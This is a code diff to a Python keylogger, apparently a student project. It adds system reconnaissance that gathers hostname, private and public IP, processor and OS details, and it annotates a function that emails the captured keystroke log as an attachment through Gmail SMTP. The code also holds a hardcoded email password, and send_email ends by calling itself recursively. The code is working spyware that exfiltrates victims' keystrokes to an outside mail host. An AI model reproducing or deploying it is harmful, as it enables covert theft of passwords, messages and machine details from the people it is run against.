@@ -36,61 +36,91 @@ from PIL import ImageGrab
 
 # default variables
 keys_information = "key_log.txt"  # where all the key that are logged going to be appended to
-email_address = "collegepjct@gmail.com" # email we are going to be send from
+system_information ="systemInfo.txt" # create a new file for system information (processor, hostname, private IP address)
+
+email_address = "collegepjct@gmail.com" # EMAIL address of the sender
 password = "Pr&c!s@Mud4r"
 
-toaddr = "collegepjct@gmail.com"
+toaddr = "collegepjct@gmail.com" # EMAIL address of the receiver
 
 file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\Test2\\Project"  # file path where the key_log.txt will be store
 extend = "\\"
 
 # email controls/functionality - send the keystrokes to email
 def send_email(filename, attachment, toaddr):
+
     fromaddr = email_address
 
+    # instance of MIMEMultipart
     # create a message (Multi internet mail extensions) allowing to format email msg to support character, text and attachments
     msg = MIMEMultipart()
 
-    msg['From'] = fromaddr # define the sending address
-    msg['To'] = toaddr
-    msg['Subject'] = "Log File"
+    msg['From'] = fromaddr # storing the senders email address
+    msg['To'] = toaddr # storing the receivers email address
+    msg['Subject'] = "Log File" # storing the subject
 
-    body = "Body_of_the_mail"
+    body = "Body_of_the_mail" #string to store the body of the mail
 
-    msg.attach(MIMEText(body, 'plain'))
+    msg.attach(MIMEText(body, 'plain')) #attach the body with the msg instance
 
+    # attach the body with the msg instance
     filename = filename
     attachment = open(attachment, 'rb')
 
+    # attach the body with the msg instance
     p = MIMEBase('application', 'octet-stream')
 
-    # encode the message
-    p.set_payload(attachment.read()) #read the attachment
+    # To change the payload into encoded form
+    p.set_payload((attachment).read())
 
-    encoders.encode_base64(p) # finish encode
+    # encode into base64
+    encoders.encode_base64(p)
 
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename) # add header to the msg
 
-    msg.attach(p) # attach the msg
+    msg.attach(p) # attach the instance 'p' to instance 'msg'
 
-    # create SMTP session
+    # attach the instance 'p' to instance 'msg'
     s = smtplib.SMTP('smtp.gmail.com', 587)
 
-    s.starttls() # start TLS session
+    s.starttls() # start TLS for security
 
-    s.login(fromaddr, password) # login to the email
+    s.login(fromaddr, password) # Authentication
 
-    text = msg.as_string() # convert the MIME msg  into string
+    text = msg.as_string() # Converts the Multipart msg into a string
 
-    s.sendmail(fromaddr, toaddr, text) # send email
-    s.quit()
+    s.sendmail(fromaddr, toaddr, text) # sending the mail
+
+    s.quit()# terminating the session
 
     send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+# get the computer information
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f: # open systemInfo.txt file
+        hostname = socket.gethostname() # to get the hostname
+        IPAddr = socket.gethostbyname(hostname) #to get the IP address
+
+        #find th public IP Address using ipify
+        try:
+            public_ip = get("https://api.ipify.org").text # define the public IP variable, get info and convert to text
+            f.write("Public IP Address: " + public_ip) # write the public IP to the log file
+
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query")
+
+        #get processor, system, machine, hostname and private IP information - Using platform module
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
 
 # constant variable
 count = 0
 keys = []  # where each key will be appended to the list
-
 
 def on_press(key):
     global keys, count
@@ -103,7 +133,6 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
-
 
 # write the keys to the key_log.txt file
 def write_file(keys):
